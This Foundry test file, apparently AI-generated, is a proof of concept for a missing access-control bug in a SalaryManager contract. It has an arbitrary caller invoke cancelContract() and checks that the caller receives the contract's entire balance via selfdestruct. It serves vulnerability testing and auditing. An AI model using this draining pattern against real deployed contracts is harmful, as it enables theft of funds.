// Generation Time: 28,76s
// Input Tokens: 2747
// Output Tokens: 1403
// Reasoning Tokens: 815


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new SalaryManager();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // Constrain the 'caller'.
        // Caller cannot be the test contract itself (which is the owner).
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Setup: Fund the contract to satisfy the require condition
        // _totalAllocated starts at 0, so we need balance > 0 for the condition
        // require(_totalAllocated < address(this).balance) to pass
        vm.deal(address(_contractUnderTest), 1 ether);
        
        // Record initial state
        uint256 initialContractBalance = address(_contractUnderTest).balance;
        uint256 initialCallerBalance = caller.balance;
        
        // Switch context to the arbitrary caller
        vm.prank(caller);
        
        // Trigger the sensitive method - this should fail if properly protected
        // but will succeed due to missing access control (no onlyOwner modifier)
        _contractUnderTest.cancelContract();
        
        // Assert: The caller received the funds via selfdestruct, proving the vulnerability
        assertEq(caller.balance, initialCallerBalance + initialContractBalance);
    }
}
